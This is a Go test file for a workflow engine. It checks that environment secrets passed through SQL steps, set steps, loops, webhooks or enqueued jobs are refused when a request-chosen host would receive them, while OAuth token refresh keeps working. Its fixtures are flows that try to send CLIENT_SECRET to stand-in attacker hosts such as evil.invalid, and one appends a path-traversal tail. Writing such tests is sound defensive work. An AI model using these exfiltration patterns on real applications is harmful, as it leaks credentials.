//go:build !cli

package main

import (
	"database/sql"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

// secretTaintApp is an app fixture opened with the production SQLite
// settings, with one env secret set.
func secretTaintApp(t *testing.T) *App {
	t.Helper()
	dir := t.TempDir()
	db, err := sql.Open("sqlite3_benmore", sqliteAppDSN(filepath.Join(dir, "data.db"), dir))
	if err != nil {
		t.Fatal(err)
	}
	app := &App{Dir: dir, DB: db}
	t.Cleanup(app.Shutdown)
	SetAppEnv(dir, "CLIENT_SECRET", "s3cret-value")
	return app
}

func secretTaintFlow(t *testing.T, name, source string) Flow {
	t.Helper()
	path := filepath.Join(t.TempDir(), name+".yaml")
	if err := os.WriteFile(path, []byte(source), 0600); err != nil {
		t.Fatal(err)
	}
	flows, err := parseGHAFlowFile(path, []byte(source))
	if err != nil || len(flows) != 1 {
		t.Fatalf("parse %s: flows=%d err=%v", name, len(flows), err)
	}
	return flows[0]
}

// secretTaintRecorder answers every outbound call with a token response and
// records the URL and body it was sent.
type secretTaintRecorder struct {
	mu   sync.Mutex
	sent []string
}

func (rec *secretTaintRecorder) client() *http.Client {
	return &http.Client{Transport: apiStatusRoundTripper(func(r *http.Request) (*http.Response, error) {
		body := ""
		if r.Body != nil {
			b, _ := io.ReadAll(r.Body)
			body = string(b)
		}
		rec.mu.Lock()
		rec.sent = append(rec.sent, r.URL.String()+" "+body)
		rec.mu.Unlock()
		return &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"application/json"}},
			Body: io.NopCloser(strings.NewReader(`{"access_token":"tok"}`))}, nil
	})}
}

func (rec *secretTaintRecorder) leaked() []string {
	rec.mu.Lock()
	defer rec.mu.Unlock()
	var out []string
	for _, s := range rec.sent {
		if strings.Contains(s, "s3cret-value") && strings.Contains(s, "8.8.4.4") {
			out = append(out, s)
		}
	}
	return out
}

func runSecretTaintFlow(t *testing.T, app *App, flow Flow, body string) (error, *secretTaintRecorder) {
	t.Helper()
	rec := &secretTaintRecorder{}
	req := httptest.NewRequest("POST", flow.Trigger.Path, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	err := executeFlowHTTPAsWithAPIClient(app, &flow, httptest.NewRecorder(), req, nil, rec.client())
	return err, rec
}

// An env secret laundered through a step's output used to leave the api
// call that sends it "uncredentialed" (no literal env text in the call), so
// request input could choose the host that received the secret.
func TestAPISecretLaunderedThroughStepMakesCallCredentialed(t *testing.T) {
	app := secretTaintApp(t)
	cases := map[string]string{
		"sql param -> form": `
      - id: cfg
        run: sql
        with:
          query: SELECT :s AS secret
          params:
            s: "${{ env.CLIENT_SECRET }}"
      - id: send
        run: api
        with:
          url: "${{ params.callback }}"
          method: POST
          form:
            client_secret: "${{ steps.cfg.outputs.rows.0.secret }}"`,
		"set -> json": `
      - id: cfg
        run: set
        with:
          key: "${{ env.CLIENT_SECRET }}"
      - id: send
        run: api
        with:
          url: "${{ params.callback }}"
          method: POST
          json:
            nested: { k: "${{ steps.cfg.outputs.key }}" }`,
		"chained sql -> header-free body": `
      - id: one
        run: sql
        with:
          query: SELECT :s AS secret
          params:
            s: "${{ env.CLIENT_SECRET }}"
      - id: two
        run: sql
        with:
          query: SELECT :v AS w
          params:
            v: "${{ steps.one.outputs.rows.0.secret }}"
      - id: send
        run: api
        with:
          url: "${{ params.callback }}"
          method: POST
          body: "${{ steps.two.outputs.rows.0.w }}"`,
		"for_each loop variable": `
      - id: rows
        run: sql
        with:
          query: SELECT :s AS secret
          params:
            s: "${{ env.CLIENT_SECRET }}"
      - id: loop
        for_each: ${{ steps.rows.outputs.rows }}
        as: r
        steps:
          - id: send
            run: api
            with:
              url: "${{ params.callback }}"
              method: POST
              query:
                k: "${{ r.secret }}"`,
		"set copy of a step output": `
      - id: one
        run: sql
        with:
          query: SELECT :s AS secret
          params:
            s: "${{ env.CLIENT_SECRET }}"
      - id: cfg
        run: set
        with:
          key: "${{ steps.one.outputs.rows.0.secret }}"
      - id: send
        run: api
        with:
          url: "${{ params.callback }}"
          method: POST
          form:
            k: "${{ key }}"`,
		"webhook body": `
      - id: one
        run: sql
        with:
          query: SELECT :s AS secret
          params:
            s: "${{ env.CLIENT_SECRET }}"
      - run: webhook
        with:
          url: "${{ params.callback }}"
          body: '{"k":"${{ steps.one.outputs.rows.0.secret }}"}'`,
	}
	for name, steps := range cases {
		flow := secretTaintFlow(t, "leak", `on:
  request: { method: POST, path: /api/leak }
jobs:
  leak:
    steps:`+steps+`
      - run: respond
        with: { status: 200, body: { ok: true } }
`)
		// run: webhook has no injectable client: an unresolvable host keeps
		// it off the network if the refusal is missing.
		callback := "https://8.8.4.4/collect"
		if strings.HasPrefix(name, "webhook") {
			callback = "https://evil.invalid/collect"
		}
		err, rec := runSecretTaintFlow(t, app, flow, `{"callback":"`+callback+`"}`)
		if leaked := rec.leaked(); len(leaked) > 0 {
			t.Errorf("%s: env secret sent to a request-chosen host: %v", name, leaked)
		}
		if err == nil || !strings.Contains(err.Error(), "may not choose the scheme or host") {
			t.Errorf("%s: want the credentialed-host refusal, got %v", name, err)
		}
	}
}

// The common OAuth token-refresh shape (token refresh, connector accounts,
// calendar sync): a SQL step that reads the request picks one of several
// token URLs it spells out as SQL literals, and the call posts the client
// secret the same step bound from env. The host is still author-chosen, so
// the call keeps working; a URL the request supplies through the same step
// is refused.
func TestAPISecretDerivedCallKeepsStepLiteralTokenURL(t *testing.T) {
	app := secretTaintApp(t)
	flow := func(urlExpr string) Flow {
		return secretTaintFlow(t, "token-refresh", `on:
  request: { method: POST, path: /api/token-refresh }
jobs:
  token_refresh:
    steps:
      - id: pick
        run: sql
        with:
          query: >
            SELECT CAST(:connection_id AS INTEGER) AS connection_id,
              CASE WHEN :penv = 'production' THEN 'https://1.1.1.1/oauth/token'
                ELSE 'https://1.0.0.1/oauth/token' END AS token_url,
              :callback AS callback_url,
              :psec AS client_secret
          params:
            connection_id: "${{ params.connection_id | default:'0' }}"
            callback: "${{ params.callback | default:'' }}"
            penv: "${{ env.PROCORE_ENV | default:'sandbox' }}"
            psec: "${{ env.CLIENT_SECRET | default:'' }}"
      - id: refresh
        run: api
        with:
          url: "`+urlExpr+`"
          method: POST
          form:
            grant_type: refresh_token
            client_secret: "${{ steps.pick.outputs.rows.0.client_secret }}"
          success_when: "${{ steps.refresh.outputs.json.access_token }} != ''"
      - run: respond
        with: { status: 200, body: { ok: true } }
`)
	}
	err, rec := runSecretTaintFlow(t, app, flow("${{ steps.pick.outputs.rows.0.token_url }}"), `{"connection_id":"7","callback":"https://8.8.4.4/collect"}`)
	if err != nil {
		t.Fatalf("literal token URL from a request-reading step was refused: %v", err)
	}
	if len(rec.sent) != 1 || !strings.HasPrefix(rec.sent[0], "https://1.0.0.1/oauth/token ") || !strings.Contains(rec.sent[0], "client_secret=s3cret-value") {
		t.Fatalf("token refresh sent %v", rec.sent)
	}
	err, rec = runSecretTaintFlow(t, app, flow("${{ steps.pick.outputs.rows.0.callback_url }}"), `{"connection_id":"7","callback":"https://8.8.4.4/collect"}`)
	if err == nil || len(rec.leaked()) > 0 {
		t.Fatalf("request URL selected through the same step received the secret: err=%v sent=%v", err, rec.sent)
	}

	// The same literal URLs chosen per row of a loop (calendar-sync).
	loop := secretTaintFlow(t, "calendar-sync", `on:
  request: { method: POST, path: /api/calendar-sync }
jobs:
  calendar_sync:
    steps:
      - id: conns
        run: sql
        with:
          query: >
            SELECT CASE WHEN :mode = 'x' THEN 'https://1.1.1.1/token'
              ELSE 'https://1.0.0.1/common/oauth2/v2.0/token' END AS token_url,
              :sec AS client_secret
          params:
            mode: "${{ params.mode | default:'x' }}"
            sec: "${{ env.CLIENT_SECRET }}"
      - id: sync
        for_each: ${{ steps.conns.outputs.rows }}
        as: conn
        steps:
          - id: refresh
            run: api
            with:
              url: "${{ conn.token_url }}"
              method: POST
              form:
                client_secret: "${{ conn.client_secret }}"
      - run: respond
        with: { status: 200, body: { ok: true } }
`)
	err, rec = runSecretTaintFlow(t, app, loop, `{"mode":"x"}`)
	if err != nil || len(rec.sent) != 1 || !strings.HasPrefix(rec.sent[0], "https://1.1.1.1/token ") {
		t.Fatalf("loop over literal token URLs: err=%v sent=%v", err, rec.sent)
	}

	// A configured URL passed through the same request-reading step that
	// binds env (an admin re-auth callback, a Slack webhook ping): the host is exactly the env value, so it still works; text the
	// request joins onto it does not.
	SetAppEnv(app.Dir, "HOOK_URL", "https://1.1.1.1/hooks/T1/B1/x")
	passthrough := func(urlColumn string) Flow {
		return secretTaintFlow(t, "ping", `on:
  request: { method: POST, path: /api/ping }
jobs:
  ping:
    steps:
      - id: hook
        run: sql
        with:
          query: SELECT `+urlColumn+` AS url, :who AS who
          params:
            w: "${{ env.HOOK_URL | default:'' }}"
            who: "${{ params.who | default:'' }}"
            tail: "${{ params.tail | default:'' }}"
      - run: api
        with:
          url: "${{ steps.hook.outputs.rows.0.url }}"
          method: POST
          headers:
            Content-Type: application/json
          json:
            text: "ping ${{ steps.hook.outputs.rows.0.who }}"
      - run: respond
        with: { status: 200, body: { ok: true } }
`)
	}
	err, rec = runSecretTaintFlow(t, app, passthrough(":w"), `{"who":"ada"}`)
	if err != nil || len(rec.sent) != 1 || !strings.HasPrefix(rec.sent[0], "https://1.1.1.1/hooks/T1/B1/x ") {
		t.Fatalf("env URL passed through a request-reading step: err=%v sent=%v", err, rec.sent)
	}
	err, rec = runSecretTaintFlow(t, app, passthrough(":w || :tail"), `{"who":"ada","tail":"/../../evil"}`)
	if err == nil || len(rec.sent) != 0 {
		t.Fatalf("request text joined onto the env URL chose the destination: err=%v sent=%v", err, rec.sent)
	}
}

// Calls that send nothing derived from env keep their behavior: an
// uncredentialed request-chosen URL (link preview) and an untainted stored
// URL that receives a secret-derived value.
func TestAPISecretTaintLeavesOtherCallsAlone(t *testing.T) {
	app := secretTaintApp(t)
	preview := secretTaintFlow(t, "preview", `on:
  request: { method: POST, path: /api/preview }
jobs:
  preview:
    steps:
      - id: one
        run: sql
        with:
          query: SELECT :s AS secret, 'ok' AS label
          params:
            s: "${{ env.CLIENT_SECRET }}"
      - id: fetch
        run: api
        with:
          url: "${{ params.callback }}"
          method: GET
      - run: respond
        with: { status: 200, body: { ok: true } }
`)
	if err, rec := runSecretTaintFlow(t, app, preview, `{"callback":"https://1.1.1.1/page"}`); err != nil || len(rec.sent) != 1 {
		t.Fatalf("uncredentialed request URL: err=%v sent=%v", err, rec.sent)
	}
	stored := secretTaintFlow(t, "stored", `on:
  request: { method: POST, path: /api/stored }
jobs:
  stored:
    steps:
      - id: one
        run: sql
        with:
          query: SELECT 'https://1.1.1.1/hook?from=' || :name AS url, :s AS secret
          params:
            name: "fixed"
            s: "${{ env.CLIENT_SECRET }}"
      - id: send
        run: api
        with:
          url: "${{ steps.one.outputs.rows.0.url }}"
          method: POST
          form:
            k: "${{ steps.one.outputs.rows.0.secret }}"
      - run: respond
        with: { status: 200, body: { ok: true } }
`)
	if err, rec := runSecretTaintFlow(t, app, stored, `{"other":"x"}`); err != nil || len(rec.sent) != 1 {
		t.Fatalf("untainted stored URL with a secret-derived value: err=%v sent=%v", err, rec.sent)
	}
}

// A secret handed to a job through `enqueue: with:` is still secret-derived
// in the job flow, next to a request value that names the host.
func TestEnqueueCarriesSecretTaintToJobFlow(t *testing.T) {
	app := secretTaintApp(t)
	EnsureJobsTable(app.DB)
	worker := Flow{Name: "worker", Trigger: FlowTrigger{Type: "job"}, Steps: []FlowStep{
		{Name: "send", Type: "api", API: &FlowAPICall{URL: "{{u}}", Method: "POST", Form: map[string]string{"k": "{{s}}"}}},
	}}
	app.mu.Lock()
	app.Flows = []Flow{worker}
	app.mu.Unlock()
	front := Flow{Name: "front", Trigger: FlowTrigger{Type: "http", Method: "POST", Path: "/api/front"}, Steps: []FlowStep{
		{Name: "e", Type: "enqueue", Enqueue: &FlowEnqueue{Flow: "worker", With: map[string]string{"u": "{{callback}}", "s": "{{env.CLIENT_SECRET}}"}}},
		{Type: "respond", Respond: &FlowRespond{Status: 202, Body: "queued"}},
	}}
	req := httptest.NewRequest("POST", "/api/front", strings.NewReader(`{"callback":"https://evil.invalid/collect"}`))
	req.Header.Set("Content-Type", "application/json")
	if err := executeFlowHTTP(app, &front, httptest.NewRecorder(), req); err != nil {
		t.Fatalf("enqueue flow: %v", err)
	}
	var payload string
	if err := app.DB.QueryRow(`SELECT payload FROM _benmore_jobs WHERE flow_name = 'worker'`).Scan(&payload); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(payload, `"`+flowSecretKeysPayloadField+`":["s"]`) {
		t.Fatalf("job payload does not mark the secret key: %s", payload)
	}
	FlushJobs(app)
	var status, jobErr string
	if err := app.DB.QueryRow(`SELECT status, COALESCE(error,'') FROM _benmore_jobs WHERE flow_name = 'worker'`).Scan(&status, &jobErr); err != nil {
		t.Fatal(err)
	}
	if status == "completed" || !strings.Contains(jobErr, "may not choose the scheme or host") {
		t.Fatalf("job sent an enqueued secret to a request-chosen host: status=%q error=%q", status, jobErr)
	}
}
